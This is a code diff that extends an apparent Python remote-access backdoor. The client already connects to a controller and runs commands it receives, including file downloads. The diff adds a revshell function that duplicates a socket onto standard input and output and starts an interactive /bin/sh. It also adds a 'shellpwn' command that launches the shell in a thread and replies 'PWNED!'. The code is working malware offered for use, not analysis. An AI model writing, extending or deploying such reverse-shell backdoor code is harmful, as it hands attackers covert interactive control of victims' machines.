@@ -6,8 +6,29 @@ import time
 import ctypes
 import urllib
 import tcpall
+import _thread
+
+HOST="localhost"
+
+PORT=9999
 
 s=socket.socket()
+
+def revshell(port):
+
+	global HOST
+
+	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	sck.connect((socket.gethostbyname(HOST), port))
+
+	os.dup2(sck.fileno(),0)
+
+	os.dup2(sck.fileno(),1)
+
+	os.dup2(sck.fileno(),2)
+
+	p = subprocess.call(["/bin/sh", "-i"])
 
 def download(url,fname):
 
@@ -87,13 +108,17 @@ def enc(txt):
 
 def reverseconn():
 
-    host=socket.gethostbyname("localhost") 
+    global HOST
 
-    port=9999
+    global PORT
+
+    host=socket.gethostbyname(HOST) 
+
+    port=PORT
 
     global s
 
-    s.connect((host,port))
+    s.connect((HOST,PORT))
 
     while True:
 
@@ -122,6 +147,20 @@ def reverseconn():
         elif dec(recvcmd[:8].decode("utf-8"))=="download":
 
             download(dec(recvcmd[9:].decode("utf-8")),dec(tcpall.recv_all(s,1024).decode("utf-8")))
+
+        elif dec(recvcmd[:8].decode("utf-8"))=="shellpwn":
+
+            try:
+
+                prt=(int(dec(recvcmd[9:].decode("utf-8"))))
+
+                _thread.start_new_thread(revshell,(prt,))
+
+            except:
+
+                pass
+
+            tcpall.send_all(s,str.encode(enc('PWNED!')))
 
         elif len(recvcmd)>0 and dec(recvcmd[:2].decode("utf-8"))!="cd":
 
